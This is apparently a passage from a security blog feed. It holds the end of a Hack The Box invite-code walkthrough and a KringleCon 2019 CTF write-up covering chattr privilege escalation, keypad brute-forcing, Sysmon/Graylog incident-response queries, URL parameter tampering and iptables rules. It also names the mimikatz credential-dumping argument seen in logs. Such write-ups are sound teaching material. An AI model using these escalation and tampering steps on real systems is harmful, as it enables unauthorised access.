<pre tabindex="0"><code>data: &quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/vaivgr/trarengr&quot;
enctype: &quot;rot13&quot;
</code></pre><p>We can decode this rot13 with pycipher or use binascii for base64</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">virtualenv <span style="color:#ff79c6">-</span>p <span style="color:#ff79c6">/</span>usr<span style="color:#ff79c6">/</span><span style="color:#8be9fd;font-style:italic">bin</span><span style="color:#ff79c6">/</span>python3<span style="color:#bd93f9">.8</span> v3
<span style="color:#ff79c6">.</span> <span style="color:#ff79c6">./</span>v3<span style="color:#ff79c6">/</span><span style="color:#8be9fd;font-style:italic">bin</span><span style="color:#ff79c6">/</span>activate
pip install pycipher
python
<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#ff79c6">import</span> pycipher
<span style="color:#ff79c6">&gt;&gt;&gt;</span> msg <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/vaivgr/trarengr&#39;</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> dec <span style="color:#ff79c6">=</span> pycipher<span style="color:#ff79c6">.</span>Rot13()<span style="color:#ff79c6">.</span>decipher(msg, keep_punct<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#8be9fd;font-style:italic">print</span>(dec)
IN ORDER TO GENERATE THE INVITE CODE, MAKE A POST REQUEST TO <span style="color:#ff79c6">/</span>API<span style="color:#ff79c6">/</span>INVITE<span style="color:#ff79c6">/</span>GENERATE
<span style="color:#ff79c6">&gt;&gt;&gt;</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#ff79c6">import</span> binascii
<span style="color:#ff79c6">&gt;&gt;&gt;</span> msg <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;SW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl&#39;</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> dec <span style="color:#ff79c6">=</span> binascii<span style="color:#ff79c6">.</span>a2b_base64(msg)
<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#8be9fd;font-style:italic">print</span>(dec)
In order to generate the invite code, make a POST request to <span style="color:#ff79c6">/</span>api<span style="color:#ff79c6">/</span>invite<span style="color:#ff79c6">/</span>generate
</code></pre></td></tr></table>
</div>
</div><p>We are informed to use an API; the following script will do the job ;)</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">import</span> requests
<span style="color:#ff79c6">import</span> base64

BASE_URL <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;https://www.hackthebox.eu&#39;</span>
URL <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;/API/INVITE/GENERATE&#39;</span><span style="color:#ff79c6">.</span>lower()
<span style="color:#8be9fd;font-style:italic">print</span>(BASE_URL <span style="color:#ff79c6">+</span> URL)
headers <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;User-Agent&#39;</span>: <span style="color:#f1fa8c">&#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&#39;</span>, <span style="color:#f1fa8c">&#34;Upgrade-Insecure-Requests&#34;</span>: <span style="color:#f1fa8c">&#34;1&#34;</span>,<span style="color:#f1fa8c">&#34;DNT&#34;</span>: <span style="color:#f1fa8c">&#34;1&#34;</span>,<span style="color:#f1fa8c">&#34;Accept&#34;</span>: <span style="color:#f1fa8c">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;</span>,<span style="color:#f1fa8c">&#34;Accept-Language&#34;</span>: <span style="color:#f1fa8c">&#34;en-US,en;q=0.5&#34;</span>,<span style="color:#f1fa8c">&#34;Accept-Encoding&#34;</span>: <span style="color:#f1fa8c">&#34;gzip, deflate&#34;</span>}
r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(BASE_URL <span style="color:#ff79c6">+</span> URL, headers<span style="color:#ff79c6">=</span>headers)
<span style="color:#8be9fd;font-style:italic">print</span>(r<span style="color:#ff79c6">.</span>json())

<span style="color:#f1fa8c">&#34;&#34;&#34;
</span><span style="color:#f1fa8c">&lt;BS&gt;b&#39;{&#34;success&#34;:1,&#34;data&#34;:{&#34;code&#34;:&#34;WlFMVFotS1JISlUtREhKVFMtU0VOVUQtV0VEVVg=&#34;,&#34;format&#34;:&#34;encoded&#34;},&#34;0&#34;:200}&#39;
</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>

invitation_code <span style="color:#ff79c6">=</span> r<span style="color:#ff79c6">.</span>json()[<span style="color:#f1fa8c">&#39;data&#39;</span>][<span style="color:#f1fa8c">&#39;code&#39;</span>]

code <span style="color:#ff79c6">=</span> base64<span style="color:#ff79c6">.</span>b64decode(invitation_code)
<span style="color:#8be9fd;font-style:italic">print</span>(code)
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>Kringlecon 2019</title><link>https://0xade1.github.io/posts/2019/12/kringlecon-2019/</link><pubDate>Wed, 25 Dec 2019 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2019/12/kringlecon-2019/</guid><description>Solved mini-challenges Escape Ed CTRL-D Objective 1) Turtle doves are in the student union near the chimney Objective 2) Unredact Threatening Document Found the letter North-West of the Quad The document is a PDF with hidden text; however just copy paste of the hidden section will reveal the Capital word we are looking for Alabaster snowball sudo - l we can execute with root privileges the command chattr chattr command can be used to add/remove attributes on a file looking at /etc/passwd we can see the default shell is not /bin/bash but /bin/nsh, however we don&amp;rsquo;t have write access lsattr /bin/nsh show the immutable &amp;lsquo;i&amp;rsquo; flag attribute is activated remove the immutable flag with chattr -i /bin/nsh overwrite /bin/nsh with /bin/bash su - alabaster_snowball with Password2 Tangle Coalbox: password is 7331 one digit is repeated once we have to type a prime number looking at the keypad, we see 1,3,7 and Enter are used the most I wrote a combi.</description><content type="html"><![CDATA[<h2 id="solved-mini-challenges">Solved mini-challenges</h2>
<ol>
<li>Escape Ed</li>
</ol>
<ul>
<li>CTRL-D</li>
</ul>
<ol start="2">
<li>Objective 1)</li>
</ol>
<ul>
<li>Turtle doves are in the student union near the chimney</li>
</ul>
<ol start="2">
<li>Objective 2) Unredact Threatening Document</li>
</ol>
<ul>
<li>Found the letter North-West of the Quad</li>
<li>The document is a PDF with hidden text; however just copy paste of the hidden section will reveal the Capital word we are looking for</li>
</ul>
<ol start="3">
<li>Alabaster snowball</li>
</ol>
<ul>
<li><code>sudo - l</code> we can execute with root privileges the command <code>chattr</code></li>
<li>chattr command can be used to add/remove attributes on a file</li>
<li>looking at /etc/passwd we can see the default shell is not /bin/bash but /bin/nsh, however we don&rsquo;t have write access</li>
<li>lsattr /bin/nsh show the immutable &lsquo;i&rsquo; flag attribute is activated</li>
<li>remove the immutable flag with <code>chattr -i /bin/nsh</code></li>
<li>overwrite /bin/nsh with /bin/bash</li>
<li><code>su - alabaster_snowball</code> with Password2</li>
</ul>
<ol start="4">
<li>Tangle Coalbox: password is 7331</li>
</ol>
<ul>
<li>one digit is repeated once</li>
<li>we have to type a prime number</li>
<li>looking at the keypad, we see 1,3,7 and Enter are used the most</li>
<li>I wrote a combi.py python script to get all prime permutations of 1,3,7,1 and 1,3,7,3 and 1,3,7,7</li>
<li>then I execute the script in bach <code>python combi.py | sort | uniq</code></li>
<li>I try all permutations and finally get the sesame to the dormitory (7331)</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-combi.py" data-lang="combi.py"><span style="color:#ff79c6">from</span> itertools <span style="color:#ff79c6">import</span> permutations
primes <span style="color:#ff79c6">=</span> [<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">7</span>, <span style="color:#bd93f9">11</span>, <span style="color:#bd93f9">13</span>, <span style="color:#bd93f9">17</span>, <span style="color:#bd93f9">19</span>, <span style="color:#bd93f9">23</span>, <span style="color:#bd93f9">29</span>, <span style="color:#bd93f9">31</span>, <span style="color:#bd93f9">37</span>]
li <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#39;1&#39;</span>,<span style="color:#f1fa8c">&#39;3&#39;</span>,<span style="color:#f1fa8c">&#39;7&#39;</span>]
<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> li:
    lis <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">list</span>(li)
    lis<span style="color:#ff79c6">.</span>append(i)
    <span style="color:#ff79c6">for</span> comb <span style="color:#ff79c6">in</span> permutations(lis, <span style="color:#bd93f9">4</span>):
      number <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join(comb), <span style="color:#bd93f9">10</span>)
      isPrime <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
      <span style="color:#ff79c6">for</span> p <span style="color:#ff79c6">in</span> primes:
          <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> (number <span style="color:#ff79c6">%</span> p):
            isPrime <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span>
            <span style="color:#ff79c6">break</span>
      <span style="color:#ff79c6">if</span> isPrime:
        <span style="color:#8be9fd;font-style:italic">print</span>(number)
</code></pre></td></tr></table>
</div>
</div><h2 id="minty-graylogs">Minty Graylog&rsquo;s</h2>
<ul>
<li><a href="https://incident.elfu.org/?challenge=graylog&amp;id=f68d1b63-fec0-44b9-bea8-095dc8a1f78a&amp;username=nQUsPw3MuKATVGTR">Direct link</a></li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon Event ID</a></li>
</ul>
<ol>
<li>
<p>We are looking for a file downloaded through Firefox, so best is to find
<code>Sysmon Event ID 2: A process changed a file creation time</code> from process &ldquo;firefox.exe&rdquo;</p>
<p>We can find this searching for sysmon file creation event id 2 with a process named firefox.exe and not junk .temp files.
We can use regular expressions to include or exclude patterns:</p>
<pre><code>FileCreateTime AND firefox NOT TargetFilename:/.+\.temp/
</code></pre>
<p><strong>Answer</strong>: C:\Users\minty\Downloads\cookie_recipe.exe</p>
</li>
<li>
<p>We can find which ip address the malicious file has connected with sysmon <code>EventID=3 (Network connection)</code> and by pivoting on ProcessImage name</p>
<pre><code>ProcessImage:/.+cookie_recipe.exe/ AND eventID=3
</code></pre>
<p><strong>Answer</strong>: 192.168.247.175:4444</p>
</li>
<li>
<p>with <code>Event ID 1: Process creation</code>, we can <code>pivot off</code> on child processes as we know cookie_recipe.exe ProcessId=5256</p>
<p>Alternatively, since all commands by the attacker are initially running through the cookie_recipe.exe binary,
we can set its full-path as our ParentProcessImage to <code>find child processes</code> it creates sorting on timestamp.</p>
<pre><code>ParentProcessImage:/.+cookie_recipe.exe/ AND eventID=1
</code></pre>
<p>or</p>
<pre><code>ParentProcessId:5256
</code></pre>
<p><strong>Answer</strong>: whoami</p>
</li>
<li>
<p>We keep scrolling down the result until we find a service
Continuing on using the cookie_reciper.exe binary as our ParentProcessImage,
we should see some more commands later on related to a service.</p>
<p><strong>Answer</strong>: webexservice</p>
</li>
<li>
<p>We can see all commands passed by the attacker by passing the binary path used for privileges escalation to ParentProcessCommandLine.
Indeed, The attacker elevates privileges using the vulnerable webexservice to run a file called cookie_recipe2.exe.
Let&rsquo;s use this binary path in our ParentProcessImage search.</p>
<pre><code>ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe2.exe CommandLine:/.+.exe/
</code></pre>
<p>We find some interesting arguments passed to an executable: <code>sekurlsa::logonpasswords</code>.
Those arguments are usually passed to mimikatz to activate a module that extracts passwords,
keys, pin codes, tickets from the memory of <code>lsass (Local Security Authority Subsystem Service)</code></p>
<p><strong>Answer</strong>: C:\cookie.exe</p>
</li>
<li>
<p>Let&rsquo;s try to see 5 minutes surrounding last <code>mimikatz</code> message for Logon event (EventId=4624).
According to <a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4624">this resource</a>
4624 is a highly valuable event since it documents each and every successful attempt to logon to the local computer
regardless of logon type, location of the user or type of account.</p>
<p>How do we know it is not legitimate login? Because it comes from the Address of the attacker:</p>
<pre><code>EventID:4624 AND SourceNetworkAddress:192.168.247.175
</code></pre>
<p><strong>Answer</strong>: alabaster</p>
</li>
<li>
<p>We can <code>identify RDP connection</code> with successful Logon Event (4624) having Type=10 (Remote Desktop)</p>
<pre><code>EventID:4624 AND LogonType:10
</code></pre>
<p><strong>Answer</strong>: 06:04:28 ** (HH:MM:SS)</p>
</li>
<li>
<p><code>LogonType=3 (File share access)</code>
The attacker has GUI access to workstation 2 via RDP.
They likely use this GUI connection to access the file system of of workstation 3 using explorer.exe
via UNC file paths (which is why we don&rsquo;t see any cmd.exe or powershell.exe process creates).
However, we still see the successful network authentication for this with event id 4624 and logon type 3.
We are looking for file sharing access which is logon type=3.
We can also exclude the original address of the attacker as we are informed that he pivots from the workstation 2 (the host he connected with RDP)</p>
<pre><code>EventID:4624 AND LogonType:3 AND NOT SourceNetworkAddress:192.168.247.175
</code></pre>
<p><strong>Answer</strong>: elfu-res-wks2,elfu-res-wks3,3 (SourceHostName,DestinationHostname,LogonType)</p>
</li>
<li>
<p>We look first for <code>EventID:3 (Network Connection)</code> having as a source workstation 3 (elfu-res-wks3) and as a destination workstation 2 (elfu-res-wks2).
I have a bit struggled because I had to use wildcard for my graylog query to include results having domain name &lsquo;.localdomain&rsquo;</p>
<pre><code>DestinationHostname:/elfu-res-wks2.*/ AND SourceHostname:/elfu-res-wks3.*/
</code></pre>
<p>There is only two messages with EventID:3 after the initial RDP connection (see answer 7).</p>
<p>Common sense would be to pivot few seconds after this message and look for file creation on destination the host:</p>
<p><code>EventID 2 (a Process changed a file creation time)</code> or <code>EventID 11 (FileCreate)</code> should do the job</p>
<pre><code>source:&quot;elfu\-res\-wks2&quot; AND EventID:2 AND _exists_:TargetFilename
</code></pre>
<p>We can look for sysmon file creation event id of 2 with a source of workstation 2.
We can also use regex to filter out overly common file paths using something like:</p>
<pre><code>source:&quot;elfu\-res\-wks2&quot; AND EventID:2 AND _exists_:TargetFilename AND NOT TargetFilename:/.+ProgramData.+/
</code></pre>
<p><strong>Answer</strong>: C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf</p>
</li>
<li>
<p>Searching for <code>super_secret_elfu_research.pdf</code> after 06:05:03, we figure out the file was transfered to <code>pastebin.com</code>
Instead of trying all IP adresses from whois, we prefer look for connection from workstation 2 to domain &lsquo;pastebin.com&rsquo;</p>
<p>We can look for the original document in CommandLine using regex.
When we do that, we see a long a long PowerShell command using Invoke-Webrequest to a remote URL of <a href="https://pastebin.com/post.php">https://pastebin.com/post.php</a>.
We can pivot off of this information to look for a sysmon <code>EventID:3 (Network Connection)</code> with a source of elfu-res-wks2 and DestinationHostname of pastebin.com.</p>
<pre><code>EventID:3 AND source:&quot;elfu\-res\-wks2&quot; AND DestinationHostname:pastebin.com
</code></pre>
<p><strong>Answer</strong>: 104.22.3.84</p>
</li>
</ol>
<p>Finally we get the Flag</p>
<pre><code>Incident Response Report #7830984301576234 Submitted.
Incident Fully Detected!
</code></pre>
<h2 id="minty-candicanes-holiday-hack-trail">Minty CandiCane&rsquo;s Holiday Hack Trail</h2>
<ul>
<li><a href="https://trail.elfu.org/gameselect/?playerid=2c621f0a-38d6-4e1d-b05b-abc55ab03195">direct url</a></li>
</ul>
<p>Looking at the url, we quickly figure out the Game in &lsquo;Easy&rsquo; mode communicates with the server with HTTP GET protocol without any server validation of inputs.</p>
<pre><code>hhc://trail.hhc/trail/?difficulty=0&amp;distance=670&amp;money=9964&amp;pace=0&amp;curmonth=12&amp;curday=20
&amp;reindeer=99&amp;runners=6&amp;ammo=64&amp;meds=22&amp;food=347&amp;name0=Chris&amp;health0=100&amp;cond0=0&amp;causeofdeath0=&amp;deathday0=0&amp;deathmonth0=0&amp;name1=Sally&amp;health1=100&amp;cond1=1&amp;causeofdeath1=&amp;deathday1=0&amp;deathmonth1=0&amp;name2=Jen&amp;health2=100&amp;cond2=0&amp;causeofdeath2=&amp;deathday2=0&amp;deathmonth2=0&amp;name3=John&amp;health3=100&amp;cond3=0&amp;causeofdeath3=&amp;deathday3=0&amp;deathmonth3=0
</code></pre>
<p>We can simply change the distance in the url to 8000 and click &lsquo;Go&rsquo; &hellip; BAM, we won the party.</p>
<pre><code>Your party has succeeded!

    Lila is happier than an elf in a toy shop!
    Dop is ready to jingle bell rock!
    Jo is ecstatic!
    Chris is over the moon!
    Date completed: 2 July
    Reindeer remaining: 2
    Money remaining: 5000

Scoring:

    4 surviving party members X 1000 = 4000 points
    2 reindeer X 400 = 800 points
    5000 money left X 1 = 5000 points
    Journey completed on 2 July: 176 days before Christmas X 50 = 8800 points
    Total score: (4000 + 800 + 5000 + 8800) X 1 Easy multiplier = 18600!
    Verification hash: 2e668469748566b41e9dffbafc04f67b
</code></pre>
<p>Hmmm, this challenge seems way too easy &hellip; Wait a minute, Minty is not giving us any hint and is still asking help to solve the challenge!
It may be because I&rsquo;ve used the direct url to the trail game instead of the browser &hellip;
somehow I might have to do it from within Kringlecon instead of spending more effort.</p>
<p>So I choose the lazy way and use Burp instead: this time parameter are passed in HTTP POST but it does not really make any difference with BURP :).
Challenge is won, Minty is giving hints on making Key from a picture.</p>
<p>The HARD challenge is much harder because this time the server control a hash value and will detect when we tamper with the distance parameter.</p>
<h2 id="kent-tinseltooth">Kent TinselTooth</h2>
<ul>
<li><a href="https://www.digitalocean.com/community/tutorials/iptables-essentials-common-firewall-rules-and-commands">iptables</a></li>
</ul>
<p>His inner voice may comes from an attacker compromising his IOT teeth braces.
He could exfiltrate information such as some prototype being hosted with default credentials in srf.elfu.org; it&rsquo;s not related to this challenge.
We need resources on <a href="https://www.digitalocean.com/community/tutorials/iptables-essentials-common-firewall-rules-and-commands">iptables here</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo iptables -P FORWARD DROP
<span style="color:#6272a4">#The following is an example of allowing traffic from a specific IP and to a specific port:</span>
sudo iptables -A INPUT -p tcp --dport <span style="color:#bd93f9">25</span> -s 172.18.5.4 -j ACCEPT
</code></pre></td></tr></table>
</div>
</div><p>Below are the instructions to win this challenge:</p>
<ol>
<li>Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.</li>
<li>Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains.</li>
<li>Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22).</li>
<li>Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80.</li>
<li>Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.</li>
<li>Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface</li>
</ol>
<p>My solution is the following:</p>
<pre><code>sudo iptables -F
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -s 172.19.0.225 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT
sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -i lo -j ACCEPT
</code></pre>
<h2 id="crate">CRATE</h2>
<p>There is a hidden div object in the Student Union with class=&lsquo;crate&rsquo;. indeed his css style attribute <code>display: none</code>.</p>
<p>Changing it to the value <code>display: block</code> and changing the z-layer to a higher value did not help either as it is below the floor div objects.
The hint says we can move elements? maybe we can pull the lid off.</p>
<ol>
<li>
<p>Open Firefox Developer tools console, and the code will be right there: ** B3PLY0XQ ** (the code will change when page is reloaded)</p>
</li>
<li>
<p>This one got me busy for some time, until I figure out there were more hints; simply Print preview the page as a PDF within Firefox and the code will be obviously stamped: J092WFRA (the code chage when we reload the page)</p>
</li>
<li>
<p>Looking at DEvTools Network view, we observe an image has been downloaded many times. Looking at it, we get the flag</p>
</li>
<li>
<p>We look at devTools storage. Amazing, the barrels object containing the code is in a form of a key-value pair in the &lsquo;Local Storage&rsquo;</p>
</li>
<li>
<p>Lol, I tried to copy the code in the html:title tags from source but it did not work. Typing in the console <code>document.title</code> reveals the title has been changed with a new code.</p>
</li>
<li>
<p>The hint is &lsquo;perspective&rsquo; is css property, so let&rsquo;s try the devTools Inspector. Changing the perspective value to &lsquo;px&rsquo; or increasing the transition period reveals the code</p>
</li>
<li>
<p>The hint instructed us to look at the first entry of the css font-family. Indeed the flag is there.</p>
</li>
<li>
<p>I google &lsquo;Firefox view event handlers&rsquo;. We read carefully and indeed, the inspector is showing an &lsquo;event&rsquo; tag. We click on the event tag and the javascript shows us that VERONICA is sad.</p>
</li>
<li>
<p>We lookup for chakra on the source code within the inspector, and as per instructed by the hint, a right-click on the span elements having class=chakras followed with changing the pseudo-class to active =&gt; one or couple letter revealed. We just iterate on all span elements.</p>
</li>
<li>
<p>we right click the last lock to see the DOM element. This lock has a cover with a disabled button. with the DOM inspector, we can select this div and delete it.
We find the code printed in the</p>
</li>
</ol>
<pre tabindex="0"><code>&lt;div class=&quot;component macaroni&quot; data-code=&quot;A33&quot;&gt;&lt;/div&gt;&lt;div class=&quot;component swab&quot; data-code=&quot;J39&quot;&gt;&lt;/div&gt;&lt;div class=&quot;component gnome&quot; data-code=&quot;XJ0&quot;&gt;
</code></pre><p>We successfully got the name of the Villain who is the &lsquo;Tooth Fairy&rsquo;. It was not necessary to open the crate neither to show the hidden crate box in the student union. However Shiny upatree keeps telling &lsquo;Hey there&rsquo; &hellip; maybe the challenge was not intended to be completed that way? Nevermind, we spent way too much time to figure out how to open the crate, so we will keep it for later.</p>
<h2 id="objective---windows-log-analysis-evaluate-attack-outcome">Objective - windows log analysis: evaluate attack outcome</h2>
<ul>
<li><a href="https://www.ericconrad.com/2016/09/deepbluecli-powershell-module-for-hunt.html">Eric Conrad Deep Blue CLI Posting</a></li>
<li><a href="https://github.com/sans-blue-team/DeepBlueCLI">Deep Blue Git</a></li>
</ul>
<p>Looking at the log through Eric Conrad threat hunting tool allows us to identify one user for whom there were one less failed attempts to connect. This is because the password spray attack was successful.
